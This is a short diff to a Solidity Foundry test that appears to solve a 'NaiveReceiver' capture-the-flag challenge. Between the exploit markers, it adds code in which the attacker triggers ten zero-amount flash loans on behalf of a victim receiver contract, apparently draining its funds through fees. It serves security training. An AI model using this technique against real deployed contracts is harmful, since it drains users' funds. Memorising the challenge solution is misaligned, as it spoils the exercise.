@@ -48,7 +48,14 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startBroadcast(attacker);
+        for(uint256 i = 0; i < 10; i++){
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
 
+        }
+
+
+        vm.stopBroadcast();
         /**
          * EXPLOIT END *
          */
